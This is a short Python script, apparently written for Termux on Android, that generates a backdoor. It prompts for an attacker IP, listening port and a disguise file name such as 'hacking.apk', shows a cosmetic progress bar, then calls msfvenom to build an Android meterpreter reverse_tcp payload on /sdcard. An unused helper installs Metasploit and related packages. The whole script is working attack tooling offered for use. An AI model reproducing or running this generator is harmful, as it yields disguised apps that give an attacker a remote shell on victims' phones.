#!/bin/usr/python3.8.x
# coding:utf-8
# Create backdoor
# Ginian recode, apa apa recode, sampah lo

import os,sys
from time import sleep
try:
	from tqdm import tqdm
except:
	exit("err : please install module 'tqdm', pip install tqdm")


class Main:
	def __init__(self):
		self.shell()
		
	def shell(self):
		os.system('clear')
		print("[+] Welcome Bambank [+]".center(50))
		print("=====-|  Create Backdoor with type simple  |-=====")
		print("=====-|          Coded by : LeON           |-=====")
		print()
		ip=input("[?] Enter your IP adress : ")
		lport=input("[?] Enter LPORT (ex.: 4444) : ")
		name=input("[?] Enter name Backdoor (ex.: hacking.apk) : ")
		sleep(2)
		print(" Create Backdoor......")
		for load in tqdm(range(270)):
			sleep(0.1)
			pass
		print(load)
		os.system("""msfvenom -p android/meterpreter/reverse_tcp LHOST="""+str(ip)+""" LPORT="""+str(lport)+""" -o /sdcard/"""+str(name))
		print("Successfully...✓")
		sleep(1)
		exit("[!] Check your Backdoor in : /sdcard/"+str(name))
		
	def install():
		os.system('pkg install root-repo -y')
		os.system('pkg install x11-repo -y') 
		os.system('pkg install unstable-repo -y')
		os.system('pkg install ruby -y')
		os.system('pkg install python2 python -y')
		os.system('pkg install php -y')
		os.system('pkg install openssh -y')
		os.system('pkg install metasploit -y')
		print("Done✓")
		
		
Main()
